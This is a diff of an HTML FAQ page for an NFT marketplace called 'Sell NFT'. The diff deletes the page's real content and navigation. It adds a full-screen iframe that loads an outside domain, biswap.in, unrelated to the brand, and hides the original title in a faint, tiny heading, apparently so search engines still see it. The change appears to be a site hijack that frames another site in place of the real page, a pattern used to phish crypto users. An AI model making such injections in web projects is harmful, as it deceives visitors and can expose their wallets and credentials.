@@ -525,59 +525,19 @@ a.inline:hover {
 }
   </script>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="../" aria-label="Sell NFT">
-      <img src="../favicon.png" width="30" height="30" alt="">
-      <span>Sell NFT</span>
-    </a>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="../how-it-works/" >How it works</a>
-      <a href="../faq/" class="active">FAQ</a>
-      <a href="../about/" >About</a>
-      <a href="../security/" >Security</a>
-      <a href="../supported-chains/" >Supported Chains</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="open-app" href="../dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="satellite-container">
-    <nav class="breadcrumb" aria-label="Breadcrumb">
-      <a href="../">Home</a> › <span>Sell NFT NFT FAQ Help Center</span>
-    </nav>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <h1 class="satellite-title">Sell NFT NFT FAQ Help Center</h1>
-    <p class="satellite-lead">Frequently asked questions regarding gas fees, minting, safety, and royalties.</p>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Sell NFT NFT FAQ Help Center
+  </h1>
 
-    <div class="faq-list">
-      <details class="faq-item" id="faq-1">
-        <summary>What is minting an NFT?</summary>
-        <div class="faq-content">
-          <p>Minting writes a unique token ID to the blockchain ledger, pointing to metadata that represents the digital asset. Read more about <a class="inline" href="https://en.wikipedia.org/wiki/Non-fungible_token" target="_blank" rel="noopener noreferrer">NFT metadata definitions</a>.</p>
-        </div>
-      </details>
-      <details class="faq-item" id="faq-2">
-        <summary>Do I retain custody of my listed NFTs?</summary>
-        <div class="faq-content">
-          <p>Yes. Our non-custodial marketplace lets you list NFTs directly from your own wallet. The item is only transferred when a buyer meets your signed price parameters, conforming to the <a class="inline" href="https://ethereum.org/en/developers/docs/standards/tokens/erc-1155/" target="_blank" rel="noopener noreferrer">ERC-1155 standard</a>.</p>
-        </div>
-      </details>
-      <details class="faq-item" id="faq-3">
-        <summary>What fees are involved in trading NFTs?</summary>
-        <div class="faq-content">
-          <p>Trading NFTs involves network gas fees, protocol fees, and optional creator royalties. Sell NFT displays these fees transparently in checkout.</p>
-        </div>
-      </details></div>
-
-    <div style="margin: 40px 0; display: flex; justify-content: flex-start;">
-      <a class="open-app" href="../dashboard/" style="max-width: 320px; display: inline-flex; justify-content: center; text-decoration: none; padding: 12px 24px; font-weight: 700;">Open Sell NFT Portal</a>
-    </div>
-
-    <a class="back-cta" href="../">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-      Back to Portal
-    </a>
-  </main>
 </body>
 </html>
